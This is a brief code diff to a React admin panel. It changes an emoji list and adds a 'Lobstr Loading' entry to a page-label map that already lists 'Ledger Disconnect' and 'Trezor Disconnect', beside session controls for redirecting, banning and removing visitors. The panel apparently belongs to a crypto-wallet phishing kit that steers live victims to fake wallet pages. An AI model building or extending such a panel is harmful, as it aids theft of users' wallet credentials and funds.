@@ -4,9 +4,8 @@ import { useAdminSocket } from '../contexts/AdminSocket';
 import notificationSound from './notification.mp3';
 
 const ANIMAL_EMOJIS = [
-  '🦊', '🦁', '🐯', '🐶', '🐱', '🐼', '🐨', '🐮', '🐷', '🐸',
-  '🦄', '🐵', '🐰', '🦒', '🦘', '🦔', '🐻', '🐙', '🦈', '🐬',
-  '🦭', '🦩', '🦥', '🦦', '🦡', '🦃', '🦆', '🦅', '🐺', '🐝'
+  '🐟', '🐠', '🐡','🐙', '🦈', '🐬',
+  '🦭','🦦'
 ];
 
 const DeviceDetectorUtil = {
@@ -392,6 +391,7 @@ const SessionRow = ({ session, onRedirect, onBan, onRemove, isNew }) => {
       'ledgerdisconnect': 'Ledger Disconnect',
       'trezordisconnect': 'Trezor Disconnect',
       'loading': 'Loading',
+      'lobstrloading': 'Lobstr Loading',
       'review': 'Review'
     };
   
